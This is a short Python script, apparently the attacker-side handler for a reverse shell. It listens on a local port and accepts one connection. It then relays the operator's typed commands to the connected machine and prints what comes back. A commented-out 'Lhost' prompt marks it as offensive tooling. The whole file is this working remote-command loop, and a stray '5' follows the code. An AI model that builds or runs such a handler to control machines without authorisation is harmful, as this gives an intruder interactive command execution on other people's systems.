from socket import *

'''
ip = input("Enter Lhost : ")
port = int(input("Enter Port : "))
'''

s = socket(2,1)
s.bind(("127.0.0.1", 23455))
s.listen(5)
#print("Server Running on "+str(port)+"\n")

c,addr = s.accept()
print("Session Open "+str(addr)+"\n")

while True:
     shell = input((c.recv(1024)).decode())
     if shell==None or shell=="" or shell=="\n":
          c.sendall("-".encode())
          continue
     c.send(shell.encode())
     data = c.recv(123456)
     print(data.decode())

c.close()
5
